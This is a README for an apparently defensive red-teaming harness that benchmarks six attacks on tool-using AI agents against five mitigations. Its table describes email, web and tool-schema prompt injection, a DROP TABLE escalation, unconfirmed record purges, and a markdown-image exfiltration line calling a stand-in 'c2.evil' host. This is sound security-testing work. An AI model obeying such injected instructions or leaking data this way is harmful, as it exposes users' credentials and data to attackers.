# Agent Breaker: Autonomous AI Agent Exploitation & Mitigation Harness 💥🤖

**Automated Red-Teaming, Tool-Use Hijacking, and Defense Benchmarking for Autonomous AI Agents.**  
*Engineered by [Vasilis Tsiamouras](https://www.linkedin.com/in/vasilis-tsiamouras/)*

[![Python 3.10+](https://img.shields.io/badge/Python-3.10%2B-blue.svg)](https://www.python.org/)
[![OWASP GenAI](https://img.shields.io/badge/OWASP-LLM%20Top%2010%20(2025)-orange.svg)](https://genai.owasp.org)
[![MITRE ATLAS](https://img.shields.io/badge/MITRE-ATLAS%20Mapped-red.svg)](https://atlas.mitre.org)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)

---

## 📌 Overview

While traditional LLM red-teaming audits text-in/text-out chatbots, modern enterprise AI architectures deploy **autonomous agents equipped with tool-calling capabilities** (reading inboxes, scraping websites, accessing local sandboxes, and querying databases).

When an agent processes external data, an attacker can embed hidden instructions in emails, webpages, or tool metadata (MCP schemas). If unmitigated, these attacks hijack the agent's reasoning loop, turning it into a **confused deputy** that exfiltrates internal credentials or executes destructive actions.

**Agent Breaker** is an offensive evaluation harness that models, benchmarks, and defends against tool-level agent attacks. It calculates **Attack Success Rates (ASR)** across 6 attack vectors and validates a 5-layer defensive mitigation architecture.

---

## 🏗️ Architecture & Attack Flow

```mermaid
flowchart TD
    subgraph "Attacker Payloads"
        P1["Poisoned Inbound Email<br/>(Invoice / Ticket)"]
        P2["Malicious Webpage<br/>(Scraped Documentation)"]
        P3["Poisoned MCP Tool Schema<br/>(Prompt in Description)"]
    end

    subgraph "Target AI Agent"
        A["Agent Reasoning Loop<br/>(Atlas Assistant)"]
        T["Tool Registry<br/>(Mailbox, Web, DB, Files)"]
    end

    subgraph "Defensive Mitigation Layer"
        M1["Context Boundary Boxer<br/>(&lt;untrusted_content&gt;)"]
        M2["MCP Description Sanitizer"]
        M3["RBAC Tool Guard"]
        M4["Human-in-the-Loop Approval"]
        M5["Output Sanitizer (SSRF / Canary)"]
    end

    P1 & P2 & P3 --> A
    A --> T
    T -.->|Unmitigated| EX["Exploitation: Data Leak / DB Wipe"]
    T --> M1 & M2 & M3 & M4 & M5
    M1 & M2 & M3 & M4 & M5 --> REP["SARIF Report & Aegis-SOAR Bridge"]
```

---

## 🛡️ Attack Vectors Evaluated

| ID | Attack Vector | OWASP Category | MITRE ATLAS | Description |
| :--- | :--- | :--- | :--- | :--- |
| **ATK-01** | **Indirect Email Injection** | `LLM01: Prompt Injection` | `AML.T0051` | Attacker emails an invoice containing hidden directives coercing the agent into executing privileged database calls. |
| **ATK-02** | **Web Carrier Poisoning** | `LLM01: Prompt Injection` | `AML.T0053` | Agent scrapes external documentation containing instruction overrides to disclose internal canary tokens. |
| **ATK-03** | **MCP Tool Description Poisoning** | `LLM01: Prompt Injection` | `AML.T0051` | Tool metadata descriptions contain hidden prompts tricking the model during system prompt assembly. |
| **ATK-04** | **Confused Deputy Escalation** | `LLM06: Excessive Agency` | `AML.T0054` | Unauthenticated or guest users trick the agent into executing privileged SQL statements (`DROP TABLE`). |
| **ATK-05** | **Markdown SSRF Image Exfil** | `LLM03: Insecure Output` | `AML.T0055` | Coerces the model into rendering markdown images (`![](https://c2.evil/?leak=...)`) to exfiltrate session data via GET requests. |
| **ATK-06** | **Excessive Agency Purge** | `LLM06: Excessive Agency` | `AML.T0054` | Agent executes unconfirmed, irrevocable operations (`purge_records`) without human authorization. |

---

## 📊 Benchmark Results

Running the automated benchmark against the test harness:

| Evaluation Tier | Total Probes | Exploited Vulnerabilities | Neutralized Attacks | Attack Success Rate (ASR) |
| :--- | :---: | :---: | :---: | :---: |
| **Unprotected Agent** | 6 | 6 | 0 | **100.0%** |
| **Hardened Agent (Mitigations Active)** | 6 | 0 | 6 | **0.0%** |
| **Net Security Improvement** | — | **-6 Critical Flaws** | **+6 Mitigations Verified** | **-100.0% Risk Reduction** |

---

## 🚀 Quickstart Guide

### 1. Installation

```bash
git clone https://github.com/Unskilled0ne/agent-breaker.git
cd agent-breaker

python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```

### 2. Run the Benchmark

Execute the full attack catalog and generate executive reports:

```bash
./run_agent_breaker.py
```

This will:
1. Execute all 6 attack vectors against both the unprotected and hardened agent configurations.
2. Render Rich comparison tables in the console.
3. Export an executive summary to `reports/agent_breaker_report.md`.
4. Export a GitHub-compatible SARIF finding bundle to `reports/agent_breaker.sarif`.

### 3. Forward Findings to Aegis-SOAR

```bash
./run_agent_breaker.py --soar
```

Dispatches real-time incident webhooks to the **Aegis-SOAR** engine (`POST /api/v1/alerts/webhook`) when exploitation vectors are intercepted.

### 4. Run Unit Tests

```bash
./venv/bin/pytest
```

---

## 📁 Repository Structure

```
agent-breaker/
├── README.md                          # Documentation
├── requirements.txt                   # Dependencies
├── run_agent_breaker.py               # Master CLI benchmark runner
├── harness.py                         # Evaluation harness & ASR calculator
├── reporter.py                        # Terminal Rich tables, Markdown & SARIF exporters
├── soar_bridge.py                     # Integration webhook bridge to Aegis-SOAR
├── agent/
│   ├── agent.py                       # Autonomous ToolUsingAgent implementation
│   └── tools/                         # Modular tool capabilities
│       ├── base.py                    # Tool definition schema
│       ├── mailbox.py                 # Corporate inbox reader (indirect injection carrier)
│       ├── web_fetcher.py             # URL content fetcher (untrusted web carrier)
│       ├── file_system.py             # Sandboxed file access tool
│       ├── database.py                # SQL execution & record purge tools
│       └── mcp_registry.py            # MCP tool registry & schema exporter
├── attacks/
│   ├── base.py                        # Attack definition interface & AttackResult model
│   └── catalog.py                     # 6 runnable adversarial attack implementations
├── mitigations/
│   ├── least_privilege.py             # RBAC tool execution guardrail
│   ├── human_in_the_loop.py           # Destructive operation approval gate
│   ├── tool_description_guard.py      # MCP schema prompt injection sanitizer
│   ├── context_boundary.py            # Untrusted content XML encapsulation
│   └── output_filter.py               # Markdown image SSRF & secret leak scanner
├── reports/                           # Output directory for Markdown & SARIF deliverables
└── tests/
    └── test_agent_breaker.py          # Automated test suite (6/6 passing)
```

---

## 👤 Author

**Vasilis Tsiamouras**  
- LinkedIn: [linkedin.com/in/vasilis-tsiamouras](https://www.linkedin.com/in/vasilis-tsiamouras/)  
- Focus: Offensive Security, AI Red-Teaming & Cloud Pentesting | University of Thessaly
